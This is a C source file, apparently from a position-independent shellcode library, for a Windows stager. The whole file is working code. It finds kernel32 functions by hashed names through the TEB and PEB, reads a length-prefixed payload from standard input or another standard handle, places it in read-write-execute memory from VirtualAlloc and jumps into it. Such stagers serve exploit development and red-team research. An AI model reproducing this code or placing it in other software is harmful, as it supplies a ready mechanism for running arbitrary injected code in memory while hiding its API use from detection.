/*
 * stager_fd payload for Windows — read a length-prefixed payload from
 * a standard HANDLE (typically stdin), allocate RWX memory via
 * VirtualAlloc, copy, and jump.
 *
 * Config layout (matches the unix stager_fd, little-endian):
 *   +0x00: stream_id (u32) — 0=stdin, 1=stdout, 2=stderr
 *
 * Resolution chain: TEB -> PEB -> kernel32.dll -> {GetStdHandle,
 * ReadFile, VirtualAlloc, ExitProcess}.
 */

#include "picblobs/os/windows.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/types.h"
#include "picblobs/win/resolve.h"

#define HASH_KERNEL32_DLL 0x7040EE75
#define HASH_GET_STD_HANDLE 0xF178843C
#define HASH_READ_FILE 0x71019921
#define HASH_VIRTUAL_ALLOC 0x382C0F97
#define HASH_EXIT_PROCESS 0xB769339E

#define STD_INPUT_HANDLE ((unsigned long)-10)
#define STD_OUTPUT_HANDLE ((unsigned long)-11)
#define STD_ERROR_HANDLE ((unsigned long)-12)

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

typedef void *(PIC_WINAPI *fn_GetStdHandle)(unsigned long nStdHandle);
typedef int(PIC_WINAPI *fn_ReadFile)(void *hFile, void *lpBuffer,
	unsigned long nNumberOfBytesToRead, unsigned long *lpNumberOfBytesRead,
	void *lpOverlapped);
typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
	unsigned long flAllocationType, unsigned long flProtect);
typedef void(PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);

__asm__(".section .config,\"aw\"\n"
	".globl stager_fd_windows_config\n"
	"stager_fd_windows_config:\n"
	".space 4\n"
	".previous\n");

/*
 * Read `count` bytes from hFile into buf, looping to handle short reads.
 * Returns 1 on success, 0 on failure/EOF-before-count.
 */
PIC_TEXT
static int read_all(fn_ReadFile rf, void *hFile, void *buf, pic_u32 count)
{
	pic_u8 *p = (pic_u8 *)buf;
	unsigned long got = 0;
	pic_u32 done = 0;
	while (done < count) {
		if (!rf(hFile, p + done, count - done, &got, PIC_NULL)) {
			return 0;
		}
		if (got == 0) {
			return 0;
		}
		done += (pic_u32)got;
	}
	return 1;
}

struct resolved_funcs {
	fn_GetStdHandle pGetStdHandle;
	fn_ReadFile pReadFile;
	fn_VirtualAlloc pVirtualAlloc;
	fn_ExitProcess pExitProcess;
};

PIC_TEXT
__attribute__((noreturn)) static void fail_fast(void) { __builtin_trap(); }

PIC_TEXT
__attribute__((noreturn)) static void exit_process(
	fn_ExitProcess pExitProcess, unsigned int uExitCode)
{
	pExitProcess(uExitCode);
	fail_fast();
}

PIC_TEXT
static int resolve_funcs(struct resolved_funcs *f)
{
	f->pGetStdHandle = (fn_GetStdHandle)pic_resolve(
		HASH_KERNEL32_DLL, HASH_GET_STD_HANDLE);
	f->pReadFile =
		(fn_ReadFile)pic_resolve(HASH_KERNEL32_DLL, HASH_READ_FILE);
	f->pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
	f->pExitProcess = (fn_ExitProcess)pic_resolve(
		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);
	return f->pGetStdHandle && f->pReadFile && f->pVirtualAlloc &&
		f->pExitProcess;
}

PIC_TEXT
static unsigned long stream_handle_id(pic_u32 stream_id)
{
	if (stream_id == 1) {
		return STD_OUTPUT_HANDLE;
	}
	if (stream_id == 2) {
		return STD_ERROR_HANDLE;
	}
	return STD_INPUT_HANDLE;
}

PIC_TEXT
static pic_u32 read_payload_size(fn_ReadFile rf, void *hFile)
{
	pic_u8 size_buf[4];
	if (!read_all(rf, hFile, size_buf, 4)) {
		return 0;
	}
	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
}

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	struct resolved_funcs f;
	if (!resolve_funcs(&f)) {
		fail_fast();
	}

	extern char stager_fd_windows_config[]
		__attribute__((visibility("hidden")));
	const pic_u8 *cfg = (const pic_u8 *)stager_fd_windows_config;
	pic_u32 stream_id = (pic_u32)cfg[0] | ((pic_u32)cfg[1] << 8) |
		((pic_u32)cfg[2] << 16) | ((pic_u32)cfg[3] << 24);

	void *h = f.pGetStdHandle(stream_handle_id(stream_id));
	if (h == (void *)-1 || h == PIC_NULL) {
		exit_process(f.pExitProcess, 1);
	}

	pic_u32 size = read_payload_size(f.pReadFile, h);
	if (size == 0 || size > 0x10000000) {
		exit_process(f.pExitProcess, 1);
	}

	void *mem = f.pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		exit_process(f.pExitProcess, 1);
	}

	if (!read_all(f.pReadFile, h, mem, size)) {
		exit_process(f.pExitProcess, 1);
	}

	((void (*)(void))mem)();

	exit_process(f.pExitProcess, 0);
}
